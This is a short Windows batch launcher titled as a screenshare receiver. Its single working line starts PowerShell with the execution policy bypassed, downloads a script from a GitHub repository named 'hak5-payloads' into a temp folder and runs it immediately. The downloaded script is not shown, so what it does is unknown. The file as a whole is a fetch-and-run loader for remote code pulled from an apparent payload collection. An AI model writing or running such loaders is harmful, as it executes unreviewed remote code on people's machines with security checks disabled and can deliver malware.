@echo off
title Screenshare Empfaenger
powershell -NoProfile -ExecutionPolicy Bypass -Command "$d=$env:TEMP+'\ps';md $d -Force;irm https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.9/Screenshare-Receiver.ps1 -OutFile $d\receiver.ps1;& $d\receiver.ps1"
echo.
pause
